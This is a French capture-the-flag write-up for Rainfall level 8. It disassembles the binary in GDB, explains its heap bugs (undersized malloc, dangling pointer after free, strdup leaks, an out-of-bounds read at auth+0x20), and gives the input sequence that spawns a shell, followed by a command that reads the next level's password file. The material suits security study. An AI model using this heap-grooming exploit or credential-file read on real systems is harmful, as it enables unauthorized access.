---

# Rainfall – Level 8

## Objectif

Analyser le binaire `level8` afin de comprendre son fonctionnement interne et exploiter une mauvaise gestion du heap permettant de déclencher `system("/bin/sh")`, puis de lire le mot de passe du niveau suivant.

---

## Reconnaissance initiale

Exécution :

```bash
./level8
```

À chaque itération, le programme affiche deux pointeurs :

```
(nil), (nil)
```

puis attend une ligne. Cela correspond à un `printf("%p, %p\n", auth, service)` dans une boucle, ce qui fournit un **leak direct** de l’état de deux variables globales pointant vers le heap.

---

## Analyse de `main` (assembleur)

Ouverture dans GDB :

```gdb
gdb -q ./level8
(gdb) disas main
```

Le début de boucle confirme l’affichage et la lecture :

```asm
0x08048575: mov 0x8049ab0,%ecx      ; service
0x0804857b: mov 0x8049aac,%edx      ; auth
0x08048591: call printf@plt

0x08048596: mov 0x8049a80,%eax      ; stdin
0x080485ae: call fgets@plt          ; fgets(buf, 0x80, stdin)
```

Vérification des constantes utiles :

```gdb
(gdb) x/s 0x8048810   # format printf
(gdb) x/s 0x8048819   # "auth "
(gdb) x/s 0x804881f   # "reset"
(gdb) x/s 0x8048825   # "service"
(gdb) x/s 0x804882d   # "login"
(gdb) x/s 0x8048833   # "/bin/sh"
(gdb) x/s 0x804883b   # "Password:\n"
```

---

## Commandes reconnues

Le parsing se fait via des comparaisons `repz cmpsb` (équivalent `strncmp`) :

* `auth ` (comparaison sur 5 octets)
* `reset` (5 octets)
* `service` (6 octets)
* `login` (5 octets)

Ces blocs se suivent dans `main` et se terminent par un retour au début de boucle.

---

## Analyse mémoire : `auth` (malloc trop petit + copie bornée)

### Allocation et initialisation

Dans le bloc `auth` :

```asm
0x080485e4: movl $0x4,(%esp)
0x080485eb: call malloc@plt
0x080485f0: mov %eax,0x8049aac      ; auth = malloc(4)
0x080485fa: movl $0x0,(%eax)        ; *(int*)auth = 0
```

Observation du pointeur renvoyé par `malloc` :

```gdb
(gdb) b *0x080485eb
(gdb) run
# saisir: auth test
(gdb) finish
(gdb) p/x $eax
(gdb) x/wx 0x8049aac
```

### Détail important : la copie n’est pas “illimitée”

Avant l’appel à `strcpy`, `main` calcule la longueur de `buf+5` et refuse la copie si elle dépasse `0x1e` (30) :

```asm
0x08048607: movl $0xffffffff,0x1c(%esp)
...
0x08048625: cmp $0x1e,%eax
0x08048628: ja  0x8048642            ; si len > 0x1e -> pas de strcpy
0x0804863d: call strcpy@plt          ; sinon strcpy(auth, buf+5)
```

Conséquence :

* `auth` est alloué avec **4 octets**
* la copie peut écrire jusqu’à **30 octets** (+ `\0`)
* il y a donc bien une **écriture hors limites sur le heap**, mais **bornée** (ce qui ne change pas le principe d’exploitation du niveau)

---

## Analyse mémoire : `reset` (free sans remise à zéro)

Bloc `reset` :

```asm
0x0804866b: mov 0x8049aac,%eax
0x08048673: call free@plt
```

Aucun `auth = NULL` n’est effectué. Le pointeur global `auth` reste donc non nul mais **dangling** (use-after-free potentiel).
Ce point ne sert pas nécessairement au chemin d’obtention du shell, mais il fait partie des erreurs de gestion mémoire du binaire.

---

## Analyse mémoire : `service` (strdup + fuite + heap grooming)

Bloc `service` :

```asm
0x080486a1: lea 0x20(%esp),%eax   ; buf
0x080486a5: add $0x7,%eax         ; buf+7 (après "service ")
0x080486ab: call strdup@plt
0x080486b0: mov %eax,0x8049ab0    ; service = strdup(...)
```

Points clés :

* `strdup` entraîne une **allocation heap** (via `malloc`) puis copie la chaîne.
* Le programme ne libère jamais l’ancien `service` : chaque appel **consomme un nouveau chunk** (fuite), et `service` pointe seulement vers le dernier.
* Même `service` sans argument alloue : `fgets` lit `"service\n\0"`, donc `buf+7` pointe sur `"\n"` (ou `""` selon l’offset exact), ce qui reste une chaîne duplicable → allocation minimale.

Ce comportement permet un **heap grooming** simple : répéter `service` fait avancer le heap jusqu’à obtenir une disposition favorable, contrôlable grâce au leak `%p, %p`.

---

## Condition `login` : lecture hors limites à `auth + 0x20`

Bloc `login` :

```asm
0x080486e2: mov 0x8049aac,%eax     ; eax = auth
0x080486e7: mov 0x20(%eax),%eax    ; eax = *(auth+0x20)
0x080486ea: test %eax,%eax
0x080486ec: je 0x80486ff           ; si 0 -> "Password:\n"
0x080486ee: movl $0x8048833,(%esp) ; "/bin/sh"
0x080486f5: call system@plt
```

Deux implications directes :

1. **Aucun check `auth != NULL`** : un `login` sans `auth` provoque un déréférencement invalide.
2. Le test lit à l’offset **+0x20** (32) depuis un bloc `auth` qui ne fait que **4 octets** → **read OOB**.

En pratique, `*(auth + 0x20)` tombe dans une zone adjacente du heap : contenu d’un chunk voisin, données déposées par `service`, ou métadonnées selon la disposition. Le but est uniquement que la valeur lue soit **non nulle**.

Vérification GDB au moment du test :

```gdb
(gdb) b *0x080486e7
(gdb) run
# exécuter un scénario auth/service, puis "login"
(gdb) x/wx 0x8049aac
(gdb) set $a = *(char**)0x8049aac
(gdb) x/wx $a+0x20
```

---

## Exploitation (chemin reproductible)

### Principe

L’exploitation consiste à :

1. Initialiser `auth` (obligatoire pour éviter un crash lors du `login`)
2. Créer une allocation `service` suffisamment proche sur le heap
3. Faire en sorte que la mémoire lue à `auth+0x20` soit **non nulle** (souvent via les octets non nuls de la chaîne `service`)
4. Déclencher `login` → `system("/bin/sh")`

Le leak affiché à chaque boucle permet de vérifier l’ordre et la proximité des allocations (souvent `auth` puis `service` juste après).

### Exemple d’exécution

```bash
./level8
auth a
service AAAAAAAAAAAAAAAAAAAAAAAAAAA
login
```

Si la disposition n’est pas immédiatement favorable, `service` peut être répété (heap grooming) :

```text
auth a
service
service
service AAAAAAAAAAAAAAAAAAAAAAAAAAA
login
```

Une fois le shell obtenu :

```bash
cat /home/user/level9/.pass
```

---

## Conclusion

Le niveau 8 repose sur une combinaison d’erreurs heap :

* `auth` : `malloc(4)` + copie **bornée** (≤ 0x1e) mais tout de même **hors limites**.
* `login` : test sur `*(auth+0x20)` → **lecture hors limites** contrôlable par l’état des allocations voisines.
* `service` : `strdup` réutilisable, allocations répétées sans `free` → **fuite + heap grooming**.
* `reset` : `free(auth)` sans remise à zéro → pointeur global **dangling**.

L’obtention de `/bin/sh` vient du fait que la lecture à `auth+0x20` “tombe” dans une zone du heap influencée par `service` (souvent remplie d’octets non nuls), ce qui rend la condition vraie et déclenche `system("/bin/sh")`.

---
